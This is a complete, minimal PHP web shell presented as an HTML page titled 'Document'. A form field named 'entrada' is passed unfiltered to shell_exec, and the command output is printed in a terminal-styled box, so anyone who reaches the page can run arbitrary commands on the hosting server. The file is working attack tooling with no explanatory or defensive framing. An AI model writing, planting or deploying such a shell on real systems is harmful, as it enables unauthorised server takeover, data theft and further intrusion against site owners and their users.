<!DOCTYPE html>
<html lang="en">

<?php

if (isset($_POST["entrada"])) {
    $shell = shell_exec($_POST['entrada']);
}
?>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        div{
            height: 380px;
            width: 640px;
            margin: 0 auto;
            border: solid;
            border-color: green;
            font-size: 16px;
        }
        input[type=text]{
            margin-left: 318px;
            width: 630px;
            margin-top: 10px
        }
        body {
	    background-color: black;
	    color: #00ff00;
        }
    </style>
</head>
<body>
    <div><?php echo "$shell\n";?></div>
    <form action="" method="post">
        <input type="text" name="entrada">
    </form>
</body>
</html>